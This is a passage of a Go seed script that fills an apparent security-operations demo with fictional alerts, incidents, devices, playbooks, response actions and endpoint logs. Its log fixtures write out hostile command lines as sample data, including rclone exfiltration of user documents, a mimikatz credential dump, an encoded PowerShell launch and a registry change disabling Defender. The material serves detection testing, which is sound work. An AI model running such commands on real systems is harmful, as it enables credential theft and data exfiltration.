		// low + active
		{"Unsigned DLL loaded by trusted process", "KIOSK-LOBBY-01", "", "Defense Evasion", model.SeverityLow, model.SourceEndpoint, model.AlertStatusActive, 60, -1},
		{"Abnormal data volume on backup server", "NAS-BACKUP-01", "svc-backup", "Collection", model.SeverityLow, model.SourceEndpoint, model.AlertStatusActive, 80, -1},
		// syslog source
		{"Syslog: Repeated sudo failures on Linux host", "SRV-DB-03", "devops", "Privilege Escalation", model.SeverityMedium, model.SourceSyslog, model.AlertStatusActive, 35, -1},
		// investigating status
		{"Cleartext credentials in environment variable", "SRV-APP-07", "svc-app", "Credential Access", model.SeverityMedium, model.SourceEndpoint, model.AlertStatusInvestigate, 52, -1},
		{"SSH brute force from external IP", "WEB-FRONT-02", "", "Credential Access", model.SeverityMedium, model.SourceNetwork, model.AlertStatusInvestigate, 72, -1},
		{"AWS IAM policy modification outside change window", "aws-prod-vpc", "svc-terraform", "Privilege Escalation", model.SeverityHigh, model.SourceCloud, model.AlertStatusInvestigate, 90, -1},
		// resolved status
		{"Python reverse shell spawned from web process", "WEB-FRONT-02", "www-data", "Execution", model.SeverityCritical, model.SourceEndpoint, model.AlertStatusResolved, 96, 0},
		{"Admin password reset without ticket", "DC-PROD-01", "admin", "Privilege Escalation", model.SeverityHigh, model.SourceIdentity, model.AlertStatusResolved, 120, 6},
		{"Outbound RDP connection to unknown host", "LAPTOP-CEO-01", "ceo", "Lateral Movement", model.SeverityMedium, model.SourceNetwork, model.AlertStatusResolved, 144, 3},
		{"Macro execution in Office document", "WKSTN-047", "jdoe", "Execution", model.SeverityHigh, model.SourceEndpoint, model.AlertStatusResolved, 168, 0},
		{"Exploit attempt against Apache Log4j (CVE-2021-44228)", "SRV-APP-07", "", "Initial Access", model.SeverityCritical, model.SourceNetwork, model.AlertStatusResolved, 200, 7},
		// false_positive status
		{"Scheduled backup process flagged as exfiltration", "NAS-BACKUP-01", "svc-backup", "Exfiltration", model.SeverityMedium, model.SourceEndpoint, model.AlertStatusFalsePos, 240, 9},
		// auto_closed status
		{"Repeated login failure — IT admin maintenance", "SRV-MAIL-01", "it-admin", "Credential Access", model.SeverityLow, model.SourceIdentity, model.AlertStatusAutoClosed, 310, -1},

		// ── additional alerts spread over the last 7 days ──────────────────────
		// critical / initial_access / identity
		{"Golden ticket attack — forged Kerberos TGT detected", "DC-PROD-01", "svc-krbtgt", "Initial Access", model.SeverityCritical, model.SourceIdentity, model.AlertStatusActive, 13, 5},
		// critical / execution / endpoint
		{"WScript.exe spawning PowerShell with obfuscated payload", "WKSTN-047", "jdoe", "Execution", model.SeverityCritical, model.SourceEndpoint, model.AlertStatusActive, 38, 0},
		// critical / command_and_control / network
		{"DNS tunnelling to cdn-stats24.net detected (high entropy)", "WEB-FRONT-02", "", "Command and Control", model.SeverityCritical, model.SourceNetwork, model.AlertStatusInvestigate, 50, 2},
		// critical / lateral_movement / network
		{"Impacket PsExec lateral movement from SRV-DB-03 to DC-PROD-01", "SRV-DB-03", "system", "Lateral Movement", model.SeverityCritical, model.SourceNetwork, model.AlertStatusActive, 62, 3},
		// critical / persistence / endpoint (cloud source)
		{"Lambda function backdoor inserted in AWS prod environment", "aws-prod-vpc", "svc-terraform", "Persistence", model.SeverityCritical, model.SourceCloud, model.AlertStatusInvestigate, 76, -1},
		// high / privilege_escalation / identity
		{"Token impersonation via SeImpersonatePrivilege on SRV-APP-07", "SRV-APP-07", "svc-app", "Privilege Escalation", model.SeverityHigh, model.SourceEndpoint, model.AlertStatusActive, 27, -1},
		// high / initial_access / network
		{"Log4Shell exploitation attempt against WEB-FRONT-02 (CVE-2021-44228)", "WEB-FRONT-02", "", "Initial Access", model.SeverityHigh, model.SourceNetwork, model.AlertStatusResolved, 130, 7},
		// high / execution / email
		{"Macro-enabled Office document executed on LAPTOP-CEO-01", "LAPTOP-CEO-01", "ceo", "Execution", model.SeverityHigh, model.SourceEmail, model.AlertStatusResolved, 155, 0},
		// high / command_and_control / endpoint
		{"Cobalt Strike beacon heartbeat to 45.132.192.61 detected", "SRV-APP-07", "svc-app", "Command and Control", model.SeverityHigh, model.SourceEndpoint, model.AlertStatusInvestigate, 42, 7},
		// high / lateral_movement / identity
		{"Pass-the-ticket attack — reuse of Kerberos TGS on DC-PROD-01", "DC-PROD-01", "jdoe", "Lateral Movement", model.SeverityHigh, model.SourceIdentity, model.AlertStatusActive, 19, 5},
		// medium / persistence / syslog
		{"Cron job added by non-root user on SRV-DB-03", "SRV-DB-03", "devops", "Persistence", model.SeverityMedium, model.SourceSyslog, model.AlertStatusActive, 44, -1},
		// medium / initial_access / cloud
		{"Unrecognised API key used to access AWS S3 prod bucket", "aws-prod-vpc", "svc-terraform", "Initial Access", model.SeverityMedium, model.SourceCloud, model.AlertStatusInvestigate, 57, -1},
		// medium / discovery / network
		{"Nmap scan of internal subnet from KIOSK-LOBBY-01", "KIOSK-LOBBY-01", "", "Discovery", model.SeverityMedium, model.SourceNetwork, model.AlertStatusFalsePos, 105, -1},
		// low / persistence / endpoint
		{"Browser extension installed outside software catalog on LAPTOP-CEO-01", "LAPTOP-CEO-01", "ceo", "Persistence", model.SeverityLow, model.SourceEndpoint, model.AlertStatusAutoClosed, 168, -1},
		// low / command_and_control / network
		{"Outbound IRC traffic on port 6667 from SRV-APP-07", "SRV-APP-07", "", "Command and Control", model.SeverityLow, model.SourceNetwork, model.AlertStatusResolved, 142, -1},
	}
	alertKeys := make([]string, len(alertSpecs))
	for i, s := range alertSpecs {
		triggeredAt := now.Add(-time.Duration(s.hoursAgo) * time.Hour)
		a := &model.Alert{
			TenantID:        tenantID,
			AlertID:         fmt.Sprintf("ALT-%05d", i+1),
			Name:            s.name,
			Description:     s.name + " — detected by behavioral analytics on " + s.host,
			Severity:        s.sev,
			SourceType:      s.src,
			Source:          string(s.src),
			Host:            s.host,
			User:            s.user,
			MitreTactic:     s.tactic,
			Status:          s.status,
			AssetName:       s.host,
			MitreTactics:    []string{s.tactic},
			MitreTechniques: []string{},
			DetectionRule:   ruleName(s.ruleIdx),
			TriggeredAt:     triggeredAt,
			CreatedAt:       triggeredAt,
			UpdatedAt:       triggeredAt,
		}
		if s.user != "" {
			a.UserName = ptr(s.user)
		}
		if i < 6 {
			a.IOCs = []model.IocEntry{
				{Type: "ip", Value: "185.220.101.15", Verdict: "malicious"},
				{Type: "hash", Value: "a1b2c3d4e5f6789012345678901234567890abcd", Verdict: "malicious"},
			}
		}
		if err := alertRepo.Create(ctx, a); err != nil {
			fmt.Printf("warn alert %d: %v\n", i, err)
		}
		alertKeys[i] = a.Key
	}
	fmt.Printf("seeded %d alerts\n", len(alertSpecs))

	// ── 10. Incidents — cover every severity + status + smartscore range ──
	// status: new, investigating, contained, resolved, closed
	// smartscore: critical(>=80), high(60-79), medium(40-59), low(<40)
	type incSpec struct {
		name, tactic, assignee string
		sev                    model.Severity
		status                 model.IncidentStatus
		alertIdxs, assets      []int
		smartScore             float64
		hoursAgo               int
	}
	incSpecs := []incSpec{
		{
			"APT Attack — Credential Theft and Lateral Movement on Finance Network",
			"Lateral Movement", "Bob Martinez",
			model.SeverityCritical, model.IncidentStatusInvestigate,
			[]int{0, 1, 2, 3, 6, 7}, []int{0, 1, 2}, 91, 2,
		},
		{
			"Ransomware Campaign — WKSTN-047 File Encryption",
			"Impact", "Alice Chen",
			model.SeverityCritical, model.IncidentStatusInvestigate,
			[]int{4, 0, 5, 2}, []int{0}, 88, 5,
		},
		{
			"CEO Laptop Compromise via Spear-Phishing",
			"Initial Access", "",
			model.SeverityHigh, model.IncidentStatusNew,
			[]int{10, 19}, []int{4}, 74, 9,
		},
		{
			"Insider Threat — Unauthorized Data Export via Exchange",
			"Collection", "Bob Martinez",
			model.SeverityHigh, model.IncidentStatusNew,
			[]int{15, 14, 17}, []int{9, 6}, 67, 24,
		},
		{
			"Domain Controller Privilege Escalation Attempt",
			"Privilege Escalation", "Alice Chen",
			model.SeverityHigh, model.IncidentStatusInvestigate,
			[]int{12, 16, 8}, []int{2}, 79, 18,
		},
		{
			"Web Server Compromise — Python Reverse Shell",
			"Execution", "Bob Martinez",
			model.SeverityHigh, model.IncidentStatusContained,
			[]int{27, 25, 17}, []int{3}, 62, 96,
		},
		{
			"Kerberoasting + Pass-the-Hash Attack Chain",
			"Credential Access", "",
			model.SeverityCritical, model.IncidentStatusNew,
			[]int{16, 7, 6}, []int{2, 0}, 85, 28,
		},
		{
			"Perimeter Firewall Policy Tampering",
			"Defense Evasion", "Bob Martinez",
			model.SeverityMedium, model.IncidentStatusResolved,
			[]int{13}, []int{8}, 41, 200,
		},
		// closed status + low smartscore
		{
			"Scheduled Backup Misclassified as Exfiltration",
			"Exfiltration", "Alice Chen",
			model.SeverityLow, model.IncidentStatusClosed,
			[]int{32}, []int{7}, 22, 350,
		},
		// medium severity + smartscore in medium range
		{
			"Suspicious Cloud IAM Activity — AWS Prod",
			"Privilege Escalation", "Bob Martinez",
			model.SeverityMedium, model.IncidentStatusInvestigate,
			[]int{26}, []int{10}, 53, 90,
		},

		// ── additional incidents ───────────────────────────────────────────────
		{
			"Golden Ticket Forged — Domain-Wide Credential Compromise",
			"Initial Access", "analyst1",
			model.SeverityCritical, model.IncidentStatusInvestigate,
			[]int{34, 16, 7}, []int{2, 0}, 93, 13,
		},
		{
			"Cobalt Strike C2 Beaconing from Finance Segment",
			"Command and Control", "analyst2",
			model.SeverityHigh, model.IncidentStatusInvestigate,
			[]int{39, 35}, []int{5, 10}, 72, 42,
		},
		{
			"DNS Tunnelling Exfiltration via DGA Traffic",
			"Exfiltration", "analyst1",
			model.SeverityHigh, model.IncidentStatusNew,
			[]int{36}, []int{3}, 68, 50,
		},
		{
			"Impacket Lateral Movement — Finance to Domain Controller",
			"Lateral Movement", "analyst2",
			model.SeverityCritical, model.IncidentStatusContained,
			[]int{37, 40}, []int{1, 2}, 88, 62,
		},
		{
			"Cloud Infrastructure Backdoor — Lambda Persistence",
			"Persistence", "analyst1",
			model.SeverityHigh, model.IncidentStatusResolved,
			[]int{38}, []int{10}, 61, 120,
		},
	}
	for i, s := range incSpecs {
		incAlertKeys := make([]string, 0)
		for _, idx := range s.alertIdxs {
			if idx < len(alertKeys) { incAlertKeys = append(incAlertKeys, alertKeys[idx]) }
		}
		incAssets := make([]string, 0)
		for _, idx := range s.assets {
			if idx < len(assetKeys) { incAssets = append(incAssets, assetKeys[idx]) }
		}
		firstSeen := now.Add(-time.Duration(s.hoursAgo) * time.Hour)
		inc := &model.Incident{
			TenantID:   tenantID,
			IncidentID: fmt.Sprintf("INC-%05d", i+1),
			Name:       s.name, Title: s.name,
			Description:    s.name + fmt.Sprintf(" — correlated from %d alerts.", len(incAlertKeys)),
			Severity:       s.sev, Status: s.status,
			SmartScore:     s.smartScore,
			AlertIDs:       incAlertKeys, AlertCount: len(incAlertKeys),
			AffectedAssets: incAssets, HostCount: len(incAssets),
			MitreTactic:    s.tactic, MitreTactics: []string{s.tactic},
			AssignedTo:     s.assignee, FirstSeen: firstSeen,
			LastActivity:   firstSeen.Add(30 * time.Minute),
			ScoreFactors: []model.ScoreFactor{
				{Dimension: "lateral_movement", Name: "Lateral Movement", Value: s.smartScore * 0.9, Weight: 0.3},
				{Dimension: "persistence", Name: "Persistence", Value: s.smartScore * 0.7, Weight: 0.25},
				{Dimension: "data_exfiltration", Name: "Data Exfiltration", Value: s.smartScore * 0.5, Weight: 0.25},
				{Dimension: "privilege_escalation", Name: "Privilege Escalation", Value: s.smartScore * 0.8, Weight: 0.2},
			},
		}
		if s.assignee != "" { inc.AssigneeName = ptr(s.assignee) }
		if s.status == model.IncidentStatusResolved || s.status == model.IncidentStatusClosed {
			resolved := firstSeen.Add(time.Duration(s.hoursAgo/3) * time.Hour)
			inc.ResolvedAt = &resolved
		}
		if err := incRepo.Create(ctx, inc); err != nil {
			fmt.Printf("warn incident %d: %v\n", i, err)
		} else {
			fmt.Printf("incident: %s\n", inc.Key)
			for _, ak := range incAlertKeys {
				_ = alertRepo.Update(ctx, ak, map[string]any{"incident_id": inc.Key})
			}
		}
	}
	fmt.Printf("seeded %d incidents\n", len(incSpecs))

	// ── 11. Devices — cover every OS + agent_status ───────────────────────
	// os: windows, linux, macos
	// status: online, offline, installing, uninstalling, error
	type deviceSpec struct {
		hostname, ip, osType, osVer, agentVer string
		status                                model.AgentStatus
		assetIdx                              int
	}
	deviceSpecs := []deviceSpec{
		{"WKSTN-047", "10.1.2.47", "windows", "11 22H2", "7.4.2", model.AgentStatusOnline, 0},
		{"SRV-DB-03", "10.1.5.3", "linux", "Ubuntu 22.04 LTS", "7.4.2", model.AgentStatusOnline, 1},
		{"DC-PROD-01", "10.0.0.1", "windows", "Server 2022 21H2", "7.4.1", model.AgentStatusOnline, 2},
		{"WEB-FRONT-02", "10.2.1.20", "linux", "CentOS 8.5", "7.4.2", model.AgentStatusOnline, 3},
		{"LAPTOP-CEO-01", "10.1.0.5", "macos", "14.4 Sonoma", "7.4.2", model.AgentStatusOnline, 4},
		{"SRV-APP-07", "10.1.4.7", "windows", "Server 2019 1809", "7.3.9", model.AgentStatusOnline, 5},
		{"KIOSK-LOBBY-01", "10.3.0.10", "windows", "10 21H2", "7.2.0", model.AgentStatusOffline, 6},
		{"NAS-BACKUP-01", "10.1.8.1", "linux", "FreeNAS 13.0", "7.4.0", model.AgentStatusOnline, 7},
		// installing status
		{"SRV-MAIL-01", "10.1.6.2", "windows", "Server 2019 1809", "7.4.2", model.AgentStatusInstalling, 9},
		// uninstalling status
		{"WKSTN-QUARANTINE", "10.1.2.99", "windows", "11 22H2", "7.4.1", model.AgentStatusUninstalling, 12},
		// error status
		{"CCTV-LOBBY-01", "10.3.1.5", "linux", "Embedded Linux 5.15", "7.1.0", model.AgentStatusError, 11},
	}
	for i, s := range deviceSpecs {
		lastHB := now.Add(-time.Duration(i+1) * 10 * time.Minute)
		d := &model.Device{
			TenantID: tenantID, Hostname: s.hostname,
			IPAddresses: []string{s.ip}, OSType: s.osType, OSVersion: s.osVer,
			AgentVersion: s.agentVer, AgentStatus: s.status,
			AgentID:       fmt.Sprintf("agent-%05d", i+1),
			AssetID:       assetKeys[s.assetIdx],
			LastHeartbeat: &lastHB, EnrolledAt: now.Add(-time.Duration(i+10) * 24 * time.Hour),
			IP: s.ip, OS: s.osType + " " + s.osVer, Status: string(s.status),
			LastSeen:  lastHB.Format(time.RFC3339),
			CreatedAt: now.Add(-time.Duration(i+10) * 24 * time.Hour), UpdatedAt: now,
		}
		must("device "+d.Hostname, deviceRepo.Create(ctx, d))
	}
	fmt.Printf("seeded %d devices\n", len(deviceSpecs))

	// ── 12. Playbooks — cover every trigger type + status ─────────────────
	// trigger: manual, alert, incident, scheduled
	// status: active (enabled), inactive (disabled)
	type pbSpec struct {
		name, desc        string
		triggerType       model.PlaybookTriggerType
		enabled           bool
		runCount          int64
		daysAgo, lastRun  int
	}
	pbSpecs := []pbSpec{
		{"Auto-Isolate Ransomware Host", "Automatically isolates endpoint when ransomware pattern detected.", model.TriggerTypeAlert, true, 14, 30, 2},
		{"Critical Incident Response", "Full SOC response: notify analyst, collect forensics, escalate.", model.TriggerTypeIncident, true, 47, 60, 1},
		{"IOC Enrichment & Block", "Enriches IOCs via threat intel and auto-blocks malicious IPs.", model.TriggerTypeAlert, true, 203, 14, 0},
		{"Password Reset on Compromise", "Resets user password and revokes sessions on credential theft.", model.TriggerTypeAlert, true, 31, 45, 3},
		{"Weekly Vulnerability Report", "Generates and emails weekly vulnerability summary.", model.TriggerTypeScheduled, true, 12, 90, 7},
		{"Phishing Email Response", "Quarantines email, blocks sender domain, notifies user.", model.TriggerTypeAlert, true, 88, 20, 0},
		{"Daily IOC Feed Sync", "Syncs latest IOC feeds from all threat intelligence sources.", model.TriggerTypeScheduled, true, 365, 180, 1},
		{"Manual Forensic Collection", "On-demand forensic collection from target host.", model.TriggerTypeManual, true, 7, 180, 14},
		// inactive/disabled
		{"C2 Beacon Investigation", "Automated investigation for suspected C2 communication alerts.", model.TriggerTypeAlert, false, 0, 60, 0},
		{"Lateral Movement Containment", "Isolates affected hosts and resets compromised accounts.", model.TriggerTypeIncident, false, 3, 90, 30},
		// manual, enabled, never run
		{"On-Demand Active Directory Audit", "Executes AD privilege audit on demand.", model.TriggerTypeManual, true, 0, 45, 0},
	}
	for i, s := range pbSpecs {
		lastRunTime := now.Add(-time.Duration(s.lastRun) * 24 * time.Hour)
		var lastRunPtr *time.Time
		if s.runCount > 0 { lastRunPtr = &lastRunTime }
		lastRunStr := ""
		if lastRunPtr != nil { lastRunStr = lastRunPtr.Format(time.RFC3339) }
		status := "inactive"
		if s.enabled { status = "active" }
		pb := &model.Playbook{
			TenantID: tenantID, Name: s.name, Description: s.desc,
			Trigger:   model.PlaybookTrigger{Type: s.triggerType},
			IsEnabled: s.enabled, RunCount: s.runCount,
			LastRunAt: lastRunPtr, CreatedBy: "admin",
			TriggerType: string(s.triggerType), Status: status, LastRun: lastRunStr,
			CreatedAt: now.Add(-time.Duration(s.daysAgo) * 24 * time.Hour), UpdatedAt: now,
		}
		_ = i
		must("playbook "+s.name, pbRepo.Create(ctx, pb))
	}
	fmt.Printf("seeded %d playbooks\n", len(pbSpecs))

	// Retrieve incident keys for action linking.
	// Use RETURN {_key: doc._key} to get a proper JSON object that ReadDocument
	// can deserialize into a struct/map without needing the full document.
	incidentKeys := make([]string, len(incSpecs))
	{
		aql := `FOR doc IN incidents FILTER doc.tenant_id == @tid SORT doc.created_at ASC RETURN {k: doc._key}`
		cur, err := database.Query(ctx, aql, &arangodb.QueryOptions{BindVars: map[string]any{"tid": tenantID}})
		if err == nil {
			defer cur.Close()
			j := 0
			for cur.HasMore() && j < len(incidentKeys) {
				var row struct{ K string `json:"k"` }
				if _, e := cur.ReadDocument(ctx, &row); e == nil && row.K != "" {
					incidentKeys[j] = row.K
					j++
				}
			}
		}
	}
	incKey := func(i int) string {
		if i >= 0 && i < len(incidentKeys) { return incidentKeys[i] }
		return ""
	}

	// ── 13. Actions — cover every action_type + status ────────────────────
	// type: isolate_host, block_ip, kill_process, reset_password, run_script, collect_forensic, quarantine_file
	// status: pending, approved, running, completed, failed, cancelled
	type actionSpec struct {
		name, desc, result string
		actionType         model.ActionType
		targetType         model.TargetType
		targetValue        string
		assetIdx, incIdx   int
		status             model.ActionStatus
		hoursAgo           int
	}
	actionSpecs := []actionSpec{
		// isolate_host / completed
		{"Isolate WKSTN-047", "Isolate ransomware-infected endpoint from network.", "Host isolated. Network access revoked at 2026-05-23 04:14.", model.ActionTypeIsolateHost, model.TargetTypeHost, "WKSTN-047", 0, 0, model.ActionStatusCompleted, 2},
		// kill_process / completed
		{"Kill ransomware.exe on WKSTN-047", "Terminate ransomware process to halt file encryption.", "Process PID 4892 terminated successfully.", model.ActionTypeKillProcess, model.TargetTypeProcess, "ransomware.exe", 0, 1, model.ActionStatusCompleted, 2},
		// block_ip / completed
		{"Block C2 IP 185.220.101.15", "Block known C2 server on perimeter firewall.", "IP blocked on FIREWALL-EXT-01. Rule ID: fw-deny-9821.", model.ActionTypeBlockIP, model.TargetTypeIP, "185.220.101.15", 0, 0, model.ActionStatusCompleted, 3},
		// reset_password / completed
		{"Force password reset for jdoe", "Reset compromised credentials for user jdoe.", "Password reset email sent. Active sessions invalidated.", model.ActionTypeResetPassword, model.TargetTypeUser, "jdoe", 0, 0, model.ActionStatusCompleted, 5},
		// collect_forensic / completed
		{"Collect forensics from SRV-DB-03", "Collect memory dump and process list from database server.", "Forensic package collected: 2.3 GB. Stored in evidence vault.", model.ActionTypeCollectForensic, model.TargetTypeHost, "SRV-DB-03", 1, 0, model.ActionStatusCompleted, 6},
		// quarantine_file / completed
		{"Quarantine malicious file hash", "Quarantine file matching known ransomware hash.", "File quarantined on 3 endpoints. Hash added to block list.", model.ActionTypeQuarantine, model.TargetTypeProcess, "a1b2c3d4e5f6789012345678901234567890abcd", 0, 1, model.ActionStatusCompleted, 8},
		// run_script / running
		{"Run AD audit script on DC-PROD-01", "Execute Active Directory privilege audit script.", "", model.ActionTypeRunScript, model.TargetTypeHost, "DC-PROD-01", 2, 4, model.ActionStatusRunning, 1},
		// isolate_host / pending
		{"Isolate LAPTOP-CEO-01 (awaiting approval)", "Isolate CEO laptop pending phishing investigation.", "", model.ActionTypeIsolateHost, model.TargetTypeHost, "LAPTOP-CEO-01", 4, 2, model.ActionStatusPending, 9},
		// reset_password / pending
		{"Reset admin account password", "Reset domain admin password after privilege escalation.", "", model.ActionTypeResetPassword, model.TargetTypeUser, "admin", 2, 4, model.ActionStatusPending, 18},
		// collect_forensic / failed
		{"Collect forensics from WEB-FRONT-02", "Collect forensic evidence after web server compromise.", "Agent unreachable. Host may be offline. Retry scheduled.", model.ActionTypeCollectForensic, model.TargetTypeHost, "WEB-FRONT-02", 3, 5, model.ActionStatusFailed, 97},
		// block_ip / completed
		{"Block suspicious scanner IP 91.241.19.55", "Block scanner IP detected performing reconnaissance.", "IP blocked. 47 connection attempts denied.", model.ActionTypeBlockIP, model.TargetTypeIP, "91.241.19.55", 3, 3, model.ActionStatusCompleted, 24},
		// kill_process / failed
		{"Kill cryptominer on SRV-APP-07", "Terminate cryptominer process consuming CPU resources.", "Process not found — may have already exited.", model.ActionTypeKillProcess, model.TargetTypeProcess, "xmrig.exe", 5, 9, model.ActionStatusFailed, 48},
		// run_script / completed
		{"Reset network adapter on WKSTN-047", "Re-enable network interface after isolation resolved.", "Network adapter re-enabled. Host returned to production VLAN.", model.ActionTypeRunScript, model.TargetTypeHost, "WKSTN-047", 0, 0, model.ActionStatusCompleted, 72},
		// quarantine_file / pending
		{"Quarantine Mimikatz variant on SRV-DB-03", "Quarantine credential-theft tool detected by WildFire.", "", model.ActionTypeQuarantine, model.TargetTypeProcess, "cafebabe1234567890abcdef1234567890abcdef", 1, 0, model.ActionStatusPending, 14},
		// block_ip / cancelled
		{"Block legacy proxy IP 45.132.192.61", "Block suspicious proxy — superseded by ASN block.", "Cancelled: replaced by broader ASN-level block rule.", model.ActionTypeBlockIP, model.TargetTypeIP, "45.132.192.61", 3, 3, model.ActionStatusCancelled, 36},
		// approved status
		{"Isolate SRV-DB-03 (approved, queued)", "Isolate database server pending CISO approval.", "", model.ActionTypeIsolateHost, model.TargetTypeHost, "SRV-DB-03", 1, 0, model.ActionStatusApproved, 1},
	}
	for _, s := range actionSpecs {
		assetID := ""
		if s.assetIdx >= 0 && s.assetIdx < len(assetKeys) { assetID = assetKeys[s.assetIdx] }
		createdAt := now.Add(-time.Duration(s.hoursAgo) * time.Hour)
		a := &model.Action{
			TenantID: tenantID, Type: s.actionType,
			TargetType: s.targetType, TargetValue: s.targetValue,
			TargetAssetID: assetID, IncidentID: incKey(s.incIdx),
			TriggeredBy: "admin", Status: s.status,
			ResultSummary: s.result, Params: map[string]any{},
			Name: s.name, Description: s.desc, Result: s.result,
			CreatedAt: createdAt, UpdatedAt: createdAt,
		}
		must("action "+s.name, actionRepo.Create(ctx, a))
	}
	fmt.Printf("seeded %d actions\n", len(actionSpecs))

	// ── 14. Log entries — all 10 datasets, all 8 WZCP event kinds ────────────
	//
	// Layout:
	//   dataset xdr_data     — WZCP kinds 1–8, agent events from WKSTN-047/SRV-DB-03
	//   dataset syslog_raw   — raw syslog lines from Linux hosts
	//   dataset ngfw_traffic — firewall allow/deny rows
	//   dataset network_story— NetFlow connection records
	//   dataset idp_raw      — Okta / AD authentication events
	//   dataset identity_analytics — UEBA scored events
	//   dataset cloud_audit_log   — AWS CloudTrail actions
	//   dataset email_story  — mail security events
	//   dataset xdr_incident — denormalised incident/alert rows
	//   dataset asset_inventory   — asset snapshot rows
	//
	logRepo := repository.NewLogEntryRepo(database)

	type logSpec struct {
		dataset    string
		kind       uint8
		agentID    string
		hostname   string
		srcIP      string
		sessionID  string
		hoursAgo   float64
		fields     map[string]any
		rawLog     string
	}

	logSpecs := []logSpec{
		// ── xdr_data: process (kind=1) ─────────────────────────────────────
		{
			dataset: model.DatasetEndpoint, kind: model.LogKindProcess,
			agentID: "agent-00001", hostname: "WKSTN-047", srcIP: "10.1.2.47",
			sessionID: "session-wzcp-001", hoursAgo: 0.5,
			fields: map[string]any{
				"action": "create", "pid": 4892,
				"process_name": "powershell.exe",
				"process_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
				"file_hash":    "a1b2c3d4e5f6789012345678901234567890abcd",
				"cmdline":      "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
				"parent_pid": 1234, "parent_name": "winword.exe",
				"user": "jdoe", "user_domain": "CORP",
				"integrity_level": "high",
			},
		},
		{
			dataset: model.DatasetEndpoint, kind: model.LogKindProcess,
			agentID: "agent-00001", hostname: "WKSTN-047", srcIP: "10.1.2.47",
			sessionID: "session-wzcp-001", hoursAgo: 1.2,
			fields: map[string]any{
				"action": "create", "pid": 7744,
				"process_name": "rclone.exe",
				"process_path": "C:\\Users\\jdoe\\AppData\\Local\\Temp\\rclone.exe",
				"file_hash":    "deadbeef1234567890abcdef1234567890abcdef",
				"cmdline":      "rclone.exe copy C:\\Users\\jdoe\\Documents remote:exfil --transfers 32",
				"parent_pid": 4892, "parent_name": "powershell.exe",
				"user": "jdoe", "user_domain": "CORP",
			},
		},
		{
			dataset: model.DatasetEndpoint, kind: model.LogKindProcess,
			agentID: "agent-00002", hostname: "SRV-DB-03", srcIP: "10.1.5.3",
			sessionID: "session-wzcp-002", hoursAgo: 2.0,
			fields: map[string]any{
				"action": "create", "pid": 1920,
				"process_name": "mimikatz.exe",
				"process_path": "C:\\Windows\\Temp\\m.exe",
				"file_hash":    "cafebabe1234567890abcdef1234567890abcdef",
				"cmdline":      "mimikatz.exe privilege::debug sekurlsa::logonpasswords exit",
				"parent_pid": 612, "parent_name": "cmd.exe",
				"user": "SYSTEM", "user_domain": "NT AUTHORITY",
			},
		},
		{
			dataset: model.DatasetEndpoint, kind: model.LogKindProcess,
			agentID: "agent-00002", hostname: "SRV-DB-03", srcIP: "10.1.5.3",
			sessionID: "session-wzcp-002", hoursAgo: 5.5,
			fields: map[string]any{
				"action": "terminate", "pid": 1920,
				"process_name": "mimikatz.exe", "exit_code": 0,
			},
		},
		// ── xdr_data: file (kind=2) ─────────────────────────────────────────
		{
			dataset: model.DatasetEndpoint, kind: model.LogKindFile,
			agentID: "agent-00001", hostname: "WKSTN-047", srcIP: "10.1.2.47",
			sessionID: "session-wzcp-001", hoursAgo: 0.8,
			fields: map[string]any{
				"action": "rename",
				"src_path":  "C:\\Users\\jdoe\\Documents\\budget_2026.xlsx",
				"dst_path":  "C:\\Users\\jdoe\\Documents\\budget_2026.xlsx.locked",
				"file_size": 1048576, "pid": 4892, "process_name": "powershell.exe",
				"user": "jdoe",
			},
		},
		{
			dataset: model.DatasetEndpoint, kind: model.LogKindFile,
			agentID: "agent-00001", hostname: "WKSTN-047", srcIP: "10.1.2.47",
			sessionID: "session-wzcp-001", hoursAgo: 0.85,
			fields: map[string]any{
				"action": "rename",
				"src_path":  "C:\\Users\\jdoe\\Documents\\Q1_report.pdf",
				"dst_path":  "C:\\Users\\jdoe\\Documents\\Q1_report.pdf.locked",
				"file_size": 2097152, "pid": 4892, "process_name": "powershell.exe",
				"user": "jdoe",
			},
		},
		{
			dataset: model.DatasetEndpoint, kind: model.LogKindFile,
			agentID: "agent-00002", hostname: "SRV-DB-03", srcIP: "10.1.5.3",
			sessionID: "session-wzcp-002", hoursAgo: 3.0,
			fields: map[string]any{
				"action":       "create",
				"path":         "C:\\Windows\\Temp\\m.exe",
				"file_size":    512000,
				"file_hash":    "cafebabe1234567890abcdef1234567890abcdef",
				"pid":          836, "process_name": "cmd.exe",
				"user": "SYSTEM",
			},
		},
		// ── xdr_data: registry (kind=3) ─────────────────────────────────────
		{
			dataset: model.DatasetEndpoint, kind: model.LogKindRegistry,
			agentID: "agent-00001", hostname: "WKSTN-047", srcIP: "10.1.2.47",
			sessionID: "session-wzcp-001", hoursAgo: 1.5,
			fields: map[string]any{
				"action": "set_value",
				"key":    "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
				"value_name": "WindowsUpdate",
				"value_data": "C:\\Users\\jdoe\\AppData\\Local\\Temp\\rclone.exe --config remote.conf",
				"pid": 7744, "process_name": "rclone.exe",
				"user": "jdoe",
			},
		},
		{
			dataset: model.DatasetEndpoint, kind: model.LogKindRegistry,
			agentID: "agent-00002", hostname: "SRV-DB-03", srcIP: "10.1.5.3",
			sessionID: "session-wzcp-002", hoursAgo: 4.2,
			fields: map[string]any{
				"action": "set_value",
				"key":    "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender",
				"value_name": "DisableAntiSpyware",
				"value_data": "1",
				"pid": 1920, "process_name": "mimikatz.exe",
				"user": "SYSTEM",
			},
		},
		// ── xdr_data: network (kind=4) ──────────────────────────────────────
		{
			dataset: model.DatasetEndpoint, kind: model.LogKindNetwork,
			agentID: "agent-00001", hostname: "WKSTN-047", srcIP: "10.1.2.47",
			sessionID: "session-wzcp-001", hoursAgo: 1.1,
			fields: map[string]any{
				"action": "connect",
				"src_ip": "10.1.2.47", "src_port": 54321,
				"dst_ip": "185.220.101.15", "dst_port": 443,
				"proto": "tcp", "direction": "outbound",
				"bytes_out": 2097152, "bytes_in": 102400,
				"pid": 7744, "process_name": "rclone.exe",
				"user": "jdoe",
			},
		},
		{
			dataset: model.DatasetEndpoint, kind: model.LogKindNetwork,
			agentID: "agent-00002", hostname: "SRV-DB-03", srcIP: "10.1.5.3",
			sessionID: "session-wzcp-002", hoursAgo: 6.0,
			fields: map[string]any{
				"action": "connect",
				"src_ip": "10.1.5.3", "src_port": 45678,
